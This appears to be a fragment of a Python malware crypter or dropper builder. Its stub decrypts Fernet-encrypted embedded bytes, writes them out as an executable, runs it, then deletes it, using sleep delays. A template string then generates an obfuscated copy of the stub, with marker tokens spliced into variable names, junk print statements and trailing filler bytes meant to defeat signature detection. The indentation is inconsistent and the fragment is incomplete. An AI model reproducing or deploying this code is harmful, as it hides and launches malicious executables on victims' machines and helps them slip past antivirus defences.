MUTEX = 1
from cryptography.fernet import Fernet
import os
import time
time.sleep(1)
BYTES = {CRYPTED_BYTES}
KEY = {ENCRYPT_KEY}
cipher = Fernet(KEY)
BYTES = cipher.decrypt(BYTES)

with open('.exe', 'wb') as f:
    time.sleep(1)
    f.write(BYTES)

os.system(".exe")
os.remove(".exe")
time.sleep(1)
#{MUTEXTRASHBYTES}
    BONES = f'''#{MUTEX}
from cryptography.fernet import Fernet
print("{MUTEX}")
import os
print("{MUTEX}")
import time
print("{MUTEX}")
time.sleep({MUTEXDELAY})
print("{MUTEX}")
BY{MUTEX}TES{MUTEX} = {CRYPTED_BYTES}
print("{MUTEX}")
K{MUTEX}EY{MUTEX} = {ENCRYPT_KEY}
print("{MUTEX}")
cip{MUTEX}her{MUTEX} = Fernet(K{MUTEX}EY{MUTEX})
print("{MUTEX}")
BY{MUTEX}TES{MUTEX} = cip{MUTEX}her{MUTEX}.decrypt(BY{MUTEX}TES{MUTEX})
print("{MUTEX}")
with open('{MUTEX}.exe', 'wb') as f{MUTEX}:
    f{MUTEX}.write(BY{MUTEX}TES{MUTEX})
print("{MUTEX}")
os.system("{MUTEX}.exe")
print("{MUTEX}")
os.remove("{MUTEX}.exe")
#{MUTEXTRASHBYTES}
'''